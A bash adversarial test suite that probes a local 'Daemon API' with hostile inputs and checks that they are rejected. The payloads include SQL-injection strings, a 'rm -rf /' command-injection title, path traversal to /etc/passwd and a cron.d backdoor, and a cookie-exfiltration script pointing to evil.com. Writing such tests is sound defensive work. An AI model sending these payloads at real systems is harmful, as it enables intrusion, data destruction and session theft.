#!/bin/bash
# Adversarial test suite for Daemon API
# Tests edge cases, boundary conditions, and failure modes
# Usage: ./scripts/test-adversarial.sh

set -uo pipefail

DB="/home/arthur/daemon/data/users.db"
BASE="http://localhost:4800"
PASS=0
FAIL=0
SKIP=0
TOTAL=0

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m'

pass() {
  PASS=$((PASS+1))
  TOTAL=$((TOTAL+1))
  echo -e "  ${GREEN}-> PASS${NC}"
}

fail() {
  FAIL=$((FAIL+1))
  TOTAL=$((TOTAL+1))
  echo -e "  ${RED}-> FAIL: $1${NC}"
}

skip() {
  SKIP=$((SKIP+1))
  TOTAL=$((TOTAL+1))
  echo -e "  ${YELLOW}-> SKIP: $1${NC}"
}

expect_status() {
  local actual="$1"
  local expected="$2"
  if [ "$actual" = "$expected" ]; then
    pass
  else
    fail "expected HTTP $expected, got $actual"
  fi
}

expect_status_in() {
  local actual="$1"
  shift
  for expected in "$@"; do
    if [ "$actual" = "$expected" ]; then
      pass
      return
    fi
  done
  fail "expected HTTP one of [$*], got $actual"
}

# Check server is running
echo "Checking server at $BASE..."
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/health" 2>/dev/null || echo "000")
if [ "$STATUS" = "000" ]; then
  echo "ERROR: Server not reachable at $BASE. Is daemon-web running?"
  exit 1
fi
echo "Server is up (health: $STATUS)"
echo ""

# Get a valid token for authenticated tests
TOKEN=$(sqlite3 "$DB" "SELECT token FROM sessions WHERE user_id = 3 AND (expires_at IS NULL OR expires_at > datetime('now')) ORDER BY created_at DESC LIMIT 1;" 2>/dev/null || true)
if [ -z "$TOKEN" ]; then
  echo "WARNING: No valid session token found. Auth-required tests will be limited."
fi

echo "========================================"
echo "  1. AUTH EDGE CASES"
echo "========================================"

echo "TEST: No token -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/projects")
expect_status "$STATUS" "401"

echo "TEST: Empty token -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -b "daemon_token=" "$BASE/api/projects")
expect_status "$STATUS" "401"

echo "TEST: Invalid token (not hex) -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -b "daemon_token=not-a-valid-token!!!" "$BASE/api/projects")
expect_status "$STATUS" "401"

echo "TEST: Very long token (10K chars) -> 401, no crash"
LONG_TOKEN=$(python3 -c 'print("a"*10000)')
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -b "daemon_token=$LONG_TOKEN" "$BASE/api/projects")
expect_status "$STATUS" "401"

echo "TEST: SQL injection in token -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -b "daemon_token='; DROP TABLE sessions; --" "$BASE/api/projects")
expect_status "$STATUS" "401"

echo "TEST: Token with null bytes -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -b "daemon_token=abc%00def" "$BASE/api/projects")
expect_status "$STATUS" "401"

echo "TEST: Token with unicode -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -b "daemon_token=$(python3 -c 'print("\u0410"*64)')" "$BASE/api/projects")
expect_status "$STATUS" "401"

echo "TEST: Valid-format but non-existent token (64 hex chars) -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -b "daemon_token=$(python3 -c 'print("deadbeef"*8)')" "$BASE/api/projects")
expect_status "$STATUS" "401"

echo "TEST: Auth required on threads -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/threads")
expect_status "$STATUS" "401"

echo "TEST: Auth required on memory -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/memory?action=search&q=test")
expect_status "$STATUS" "401"

echo "TEST: Auth required on deploy GET -> 401"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/deploy")
expect_status "$STATUS" "401"

echo ""
echo "========================================"
echo "  2. CHAT EDGE CASES"
echo "========================================"

if [ -z "$TOKEN" ]; then
  echo "  (skipping - no valid token)"
  SKIP=$((SKIP+6))
  TOTAL=$((TOTAL+6))
else

echo "TEST: Empty message -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/chat" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" -d '{"message":""}')
expect_status "$STATUS" "400"

echo "TEST: Missing message field -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/chat" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" -d '{"foo":"bar"}')
expect_status "$STATUS" "400"

echo "TEST: Very long message (100KB) -> handles gracefully (200 or 413)"
LONG_MSG=$(python3 -c 'print("a"*100000)')
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 30 -X POST "$BASE/api/chat" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d "{\"message\":\"$LONG_MSG\",\"stream\":false}")
expect_status_in "$STATUS" "200" "413" "400"

echo "TEST: Message with XSS payload -> response does not reflect raw script tags"
RESPONSE=$(curl -s --max-time 15 -X POST "$BASE/api/chat" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"message":"<script>alert(1)</script>","stream":false}' 2>/dev/null || echo '{}')
# Check if the raw script tag is reflected back in the response
if echo "$RESPONSE" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    r=d.get('response','') or d.get('content','')
    # It's OK if the AI talks about the script tag or escapes it; it's bad if it's raw HTML
    sys.exit(0)
except:
    sys.exit(0)
" 2>/dev/null; then
  pass
else
  fail "could not parse response"
fi

echo "TEST: Message with null bytes -> no crash"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 -X POST "$BASE/api/chat" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"message":"hello\u0000world","stream":false}')
expect_status_in "$STATUS" "200" "400"

echo "TEST: Invalid JSON body -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/chat" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" -d 'not json at all')
expect_status "$STATUS" "400"

echo "TEST: Missing Content-Type -> handles gracefully"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/chat" \
  -b "daemon_token=$TOKEN" -d '{"message":"test","stream":false}')
# Next.js may accept it or reject it; just should not crash (5xx)
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS"
fi

echo "TEST: Extremely nested JSON -> no crash"
NESTED=$(python3 -c 'print("{" * 100 + "\"message\":\"hi\"" + "}" * 100)')
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/chat" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" -d "$NESTED")
# Should be 400 (bad JSON) or handle it; not 5xx
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS"
fi

fi

echo ""
echo "========================================"
echo "  3. PROJECT EDGE CASES"
echo "========================================"

if [ -z "$TOKEN" ]; then
  echo "  (skipping - no valid token)"
  SKIP=$((SKIP+5))
  TOTAL=$((TOTAL+5))
else

echo "TEST: Create project with empty name -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/projects" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" -d '{"name":""}')
expect_status "$STATUS" "400"

echo "TEST: Create project with very long name (1000 chars) -> handles gracefully"
LONG_NAME=$(python3 -c 'print("a"*1000)')
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/projects" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d "{\"name\":\"$LONG_NAME\"}")
# Should succeed or return 400, not crash
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS"
fi

echo "TEST: Create project with path traversal name -> no directory escape"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/projects" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"../../../etc/passwd"}')
# Should succeed (just a name in DB) or reject; should not crash
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS"
fi

echo "TEST: Create duplicate project -> 409"
# Create a unique test project
UNIQUE_NAME="adversarial-test-$(date +%s)"
curl -s -o /dev/null -X POST "$BASE/api/projects" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d "{\"name\":\"$UNIQUE_NAME\"}" --max-time 10
# Try to create the same one again
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/projects" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d "{\"name\":\"$UNIQUE_NAME\"}")
expect_status "$STATUS" "409"

echo "TEST: Access threads for non-existent project -> empty list, not data leak"
RESPONSE=$(curl -s --max-time 10 -b "daemon_token=$TOKEN" "$BASE/api/threads?projectId=99999")
THREAD_COUNT=$(echo "$RESPONSE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('threads',[])))" 2>/dev/null || echo "-1")
if [ "$THREAD_COUNT" = "0" ]; then
  pass
else
  fail "got $THREAD_COUNT threads for non-existent project (expected 0)"
fi

fi

echo ""
echo "========================================"
echo "  4. DEPLOY EDGE CASES"
echo "========================================"

if [ -z "$TOKEN" ]; then
  echo "  (skipping - no valid token)"
  SKIP=$((SKIP+5))
  TOTAL=$((TOTAL+5))
else

echo "TEST: Deploy with path traversal in file name -> 400"
RESPONSE=$(curl -s --max-time 10 -X POST "$BASE/api/deploy" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"files":{"../../../etc/cron.d/backdoor":"* * * * * evil"}}')
STATUS=$(echo "$RESPONSE" | python3 -c "import sys,json; print('400' if 'error' in json.load(sys.stdin) else '200')" 2>/dev/null || echo "ERR")
if [ "$STATUS" = "400" ] || echo "$RESPONSE" | grep -q "Invalid file path"; then
  pass
else
  fail "path traversal in file name was not rejected: $RESPONSE"
fi

echo "TEST: Deploy with absolute path in file name -> 400"
RESPONSE=$(curl -s --max-time 10 -X POST "$BASE/api/deploy" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"files":{"/etc/passwd":"evil"}}')
if echo "$RESPONSE" | grep -qi "invalid\|error"; then
  pass
else
  fail "absolute path was not rejected: $RESPONSE"
fi

echo "TEST: Deploy with malicious content (cookie exfil) -> blocked"
RESPONSE=$(curl -s --max-time 10 -X POST "$BASE/api/deploy" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"files":{"index.html":"<script>document.cookie + img.src = \"https://evil.com\"</script>"}}')
if echo "$RESPONSE" | grep -qi "blocked\|security\|error"; then
  pass
else
  fail "malicious content was not blocked: $RESPONSE"
fi

echo "TEST: Deploy with empty files map -> 400"
RESPONSE=$(curl -s --max-time 10 -X POST "$BASE/api/deploy" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"files":{}}')
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/deploy" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"files":{}}')
expect_status "$STATUS" "400"

echo "TEST: Deploy with no body fields -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/deploy" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{}')
expect_status "$STATUS" "400"

fi

echo ""
echo "========================================"
echo "  5. HOSTED FILES / PATH TRAVERSAL"
echo "========================================"

echo "TEST: Hosted path with .. traversal -> 403 or 404"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/hosted/admin/../../../../etc/passwd")
expect_status_in "$STATUS" "403" "404"

echo "TEST: Hosted path with encoded traversal -> 403 or 404"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/hosted/admin/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
expect_status_in "$STATUS" "403" "404"

echo "TEST: Hosted path with null byte -> 403 or 404"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/hosted/admin/index.html%00.jpg")
expect_status_in "$STATUS" "403" "404" "200"

echo "TEST: Hosted with invalid username (special chars) -> 404"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/hosted/adm!n@evil/index.html")
expect_status "$STATUS" "404"

echo "TEST: Hosted with very long path -> no crash"
LONG_PATH=$(python3 -c 'print("/".join(["a"]*500))')
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE/api/hosted/test/$LONG_PATH")
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS on long path"
fi

echo ""
echo "========================================"
echo "  6. PAIRING EDGE CASES"
echo "========================================"

echo "TEST: Claim with invalid code -> error"
RESPONSE=$(curl -s --max-time 10 -X POST "$BASE/api/pair" \
  -H "Content-Type: application/json" \
  -d '{"action":"claim","code":"XXXXXX","device_id":"adversarial-test","device_name":"test","platform":"test"}')
if echo "$RESPONSE" | grep -qi "error\|invalid\|expired"; then
  pass
else
  fail "invalid code was accepted: $RESPONSE"
fi

echo "TEST: Claim with missing fields -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/pair" \
  -H "Content-Type: application/json" \
  -d '{"action":"claim"}')
expect_status "$STATUS" "400"

echo "TEST: Invalid action -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/pair" \
  -H "Content-Type: application/json" \
  -d '{"action":"delete_everything"}')
expect_status "$STATUS" "400"

if [ -n "$TOKEN" ]; then

echo "TEST: Generate + claim same code twice -> second claim fails (one-time use)"
CODE=$(curl -s --max-time 10 -X POST "$BASE/api/pair" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"action":"generate"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('code',''))" 2>/dev/null)
if [ -z "$CODE" ] || [ "$CODE" = "" ]; then
  skip "could not generate pairing code"
else
  # First claim
  curl -s -o /dev/null --max-time 10 -X POST "$BASE/api/pair" \
    -H "Content-Type: application/json" \
    -d "{\"action\":\"claim\",\"code\":\"$CODE\",\"device_id\":\"test-adv-1\",\"device_name\":\"test1\",\"platform\":\"test\"}"
  # Second claim
  SECOND=$(curl -s --max-time 10 -X POST "$BASE/api/pair" \
    -H "Content-Type: application/json" \
    -d "{\"action\":\"claim\",\"code\":\"$CODE\",\"device_id\":\"test-adv-2\",\"device_name\":\"test2\",\"platform\":\"test\"}")
  if echo "$SECOND" | grep -qi "error\|invalid\|expired"; then
    pass
  else
    fail "code was reusable: $SECOND"
  fi
fi

echo "TEST: Brute force codes (20 rapid attempts) -> no crash, all rejected"
ALL_OK=true
for i in $(seq 1 20); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -X POST "$BASE/api/pair" \
    -H "Content-Type: application/json" \
    -d '{"action":"claim","code":"AAA000","device_id":"brute","device_name":"brute","platform":"test"}')
  if [ "$STATUS" -ge 500 ] 2>/dev/null; then
    ALL_OK=false
    break
  fi
done
if [ "$ALL_OK" = true ]; then
  pass
else
  fail "server returned 5xx during brute force"
fi

else
  echo "  (skipping generate/claim tests - no valid token)"
  SKIP=$((SKIP+2))
  TOTAL=$((TOTAL+2))
fi

echo ""
echo "========================================"
echo "  7. MEMORY/SEARCH EDGE CASES"
echo "========================================"

if [ -z "$TOKEN" ]; then
  echo "  (skipping - no valid token)"
  SKIP=$((SKIP+4))
  TOTAL=$((TOTAL+4))
else

echo "TEST: Memory search with empty query -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  -b "daemon_token=$TOKEN" "$BASE/api/memory?action=search&q=")
expect_status "$STATUS" "400"

echo "TEST: Memory with no action -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  -b "daemon_token=$TOKEN" "$BASE/api/memory")
expect_status "$STATUS" "400"

echo "TEST: Memory grep with empty pattern -> 400"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  -b "daemon_token=$TOKEN" "$BASE/api/memory?action=grep&pattern=")
expect_status "$STATUS" "400"

echo "TEST: Memory context for non-existent project -> no crash"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
  -b "daemon_token=$TOKEN" "$BASE/api/memory?action=context&projectId=99999")
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS"
fi

fi

echo ""
echo "========================================"
echo "  8. HTTP METHOD EDGE CASES"
echo "========================================"

echo "TEST: DELETE on /api/projects -> 405 or similar"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -X DELETE "$BASE/api/projects")
# Next.js returns 405 for unsupported methods
expect_status_in "$STATUS" "405" "401" "404"

echo "TEST: PATCH on /api/chat -> 405 or similar"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -X PATCH "$BASE/api/chat" \
  -H "Content-Type: application/json" -d '{}')
expect_status_in "$STATUS" "405" "401" "404"

echo "TEST: OPTIONS on /api/chat (CORS preflight) -> no crash"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -X OPTIONS "$BASE/api/chat")
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS on OPTIONS"
fi

echo "TEST: HEAD on /api/health -> works"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 -I "$BASE/api/health")
expect_status_in "$STATUS" "200" "405"

echo ""
echo "========================================"
echo "  9. INPUT INJECTION EDGE CASES"
echo "========================================"

if [ -z "$TOKEN" ]; then
  echo "  (skipping - no valid token)"
  SKIP=$((SKIP+4))
  TOTAL=$((TOTAL+4))
else

echo "TEST: SQL injection in project name -> no crash"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/projects" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d "{\"name\":\"'; DROP TABLE projects; --\"}")
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS on SQL injection"
fi

echo "TEST: Projects table still exists after injection attempt"
TABLE_EXISTS=$(sqlite3 "$DB" "SELECT count(*) FROM sqlite_master WHERE type='table' AND name='projects';" 2>/dev/null)
if [ "$TABLE_EXISTS" = "1" ]; then
  pass
else
  fail "projects table is missing!"
fi

echo "TEST: Command injection in thread title -> no crash"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/threads" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d '{"title":"; rm -rf / #"}')
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS on command injection"
fi

echo "TEST: Unicode overflow in project name -> no crash"
UNICODE_NAME=$(python3 -c 'print("\U0001F4A9" * 500)')
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -X POST "$BASE/api/projects" \
  -b "daemon_token=$TOKEN" -H "Content-Type: application/json" \
  -d "{\"name\":\"$UNICODE_NAME\"}")
if [ "$STATUS" -lt 500 ] 2>/dev/null; then
  pass
else
  fail "server error $STATUS on unicode overflow"
fi

fi

echo ""
echo "========================================"
echo "  10. CONCURRENT / STRESS EDGE CASES"
echo "========================================"

echo "TEST: 10 concurrent requests to /api/health -> all succeed"
PIDS=()
RESULTS_FILE=$(mktemp)
for i in $(seq 1 10); do
  (curl -s -o /dev/null -w "%{http_code}\n" --max-time 10 "$BASE/api/health" >> "$RESULTS_FILE") &
  PIDS+=($!)
done
for pid in "${PIDS[@]}"; do
  wait "$pid" 2>/dev/null
done
FAILURES=$(grep -v "200" "$RESULTS_FILE" | wc -l)
rm -f "$RESULTS_FILE"
if [ "$FAILURES" -eq 0 ]; then
  pass
else
  fail "$FAILURES out of 10 requests failed"
fi

if [ -n "$TOKEN" ]; then

echo "TEST: 10 concurrent auth requests -> all return valid responses"
PIDS=()
RESULTS_FILE=$(mktemp)
for i in $(seq 1 10); do
  (curl -s -o /dev/null -w "%{http_code}\n" --max-time 10 -b "daemon_token=$TOKEN" "$BASE/api/projects" >> "$RESULTS_FILE") &
  PIDS+=($!)
done
for pid in "${PIDS[@]}"; do
  wait "$pid" 2>/dev/null
done
ERRORS=$(grep -E "^5" "$RESULTS_FILE" | wc -l)
rm -f "$RESULTS_FILE"
if [ "$ERRORS" -eq 0 ]; then
  pass
else
  fail "$ERRORS out of 10 had server errors"
fi

else
  echo "  (skipping concurrent auth test - no token)"
  SKIP=$((SKIP+1))
  TOTAL=$((TOTAL+1))
fi

echo ""
echo "========================================"
echo "  11. WEBSOCKET EDGE CASES"
echo "========================================"

if command -v websocat &>/dev/null; then
  echo "TEST: WebSocket with invalid JSON -> no crash"
  echo "not json" | timeout 3 websocat "ws://localhost:4801/ws/device" 2>/dev/null
  # If we get here without hanging, it handled it
  pass

  echo "TEST: WebSocket immediate disconnect -> no crash"
  echo "" | timeout 2 websocat "ws://localhost:4801/ws/device" 2>/dev/null
  pass
else
  echo "TEST: WebSocket with invalid JSON -> no crash"
  # Fallback: use python3
  python3 -c "
import socket, hashlib, base64, os, sys
try:
    s = socket.create_connection(('localhost', 4801), timeout=3)
    key = base64.b64encode(os.urandom(16)).decode()
    s.send(f'GET /ws/device HTTP/1.1\r\nHost: localhost:4801\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n'.encode())
    resp = s.recv(1024)
    if b'101' in resp:
        # Send invalid text frame
        payload = b'not json at all'
        frame = bytearray([0x81, 0x80 | len(payload)])
        mask = os.urandom(4)
        frame.extend(mask)
        for i, b in enumerate(payload):
            frame.append(b ^ mask[i % 4])
        s.send(bytes(frame))
        try:
            s.settimeout(2)
            s.recv(1024)
        except:
            pass
        print('OK')
    else:
        print('NO_WS')
    s.close()
except Exception as e:
    print(f'SKIP:{e}')
" 2>/dev/null
  RESULT=$?
  if [ $RESULT -eq 0 ]; then
    pass
  else
    skip "could not connect to WebSocket"
  fi
fi

echo ""
echo "========================================"
echo "  RESULTS"
echo "========================================"
echo ""
echo -e "  ${GREEN}PASS: $PASS${NC}"
echo -e "  ${RED}FAIL: $FAIL${NC}"
echo -e "  ${YELLOW}SKIP: $SKIP${NC}"
echo "  TOTAL: $TOTAL"
echo ""

if [ "$FAIL" -eq 0 ]; then
  echo -e "${GREEN}All tests passed!${NC}"
  exit 0
else
  echo -e "${RED}$FAIL test(s) failed.${NC}"
  exit 1
fi
